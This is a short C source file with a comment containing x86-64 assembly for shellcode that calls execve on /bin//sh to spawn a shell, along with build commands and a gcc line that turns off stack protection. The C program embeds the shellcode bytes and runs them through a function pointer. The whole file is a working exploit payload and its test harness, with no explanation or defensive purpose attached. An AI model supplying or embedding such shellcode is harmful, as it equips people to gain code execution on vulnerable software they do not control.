/*

THIS SHELLCODE SPAWNS A NEW SHELL


global _start

section .text

_start:

	; int execve(const char *filename, char *const argv[],
        ;    char *const envp[]);
       
    push            59   		;sys_execve 		
    pop rax				;poping sys_execve of the stack into rax
    xor rsi,        rsi			;zeroing out rsi
    push rsi				;string terminator
    mov  rdi,       0x68732F2f6e69622F	;/bin//sh in reverse order
    push rdi				;pushing /bin//sh on the stack
    mov rdi,        rsp			;stack pointer to /bin//sh
    xor rdx,	    rdx         	;rdx = 0
    syscall


=======================GENERATE SHELLCODE===============================
nasm -felf64 shell.nasm -o shell.o
ld shell.o -o shell

=====================PROGRAM TO EXPLOIT================================

gcc -fno-stack-protector -z execstack shell.c

=======================C PROGRAM======================================
*/
#include <stdio.h>
#include <string.h>

char sh[]="\x6a\x3b\x58\x48\x31\xf6\x56\x48\xbf"
	  "\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
	  "\x57\x48\x89\xe7\x48\x31\xd2\x0f\x05";


void main(int argc, char **argv)
{
	printf("Shellcode Length: %d\n", strlen (sh));
	int (*func)();
	func = (int (*)()) sh;
	(int)(*func)();
}

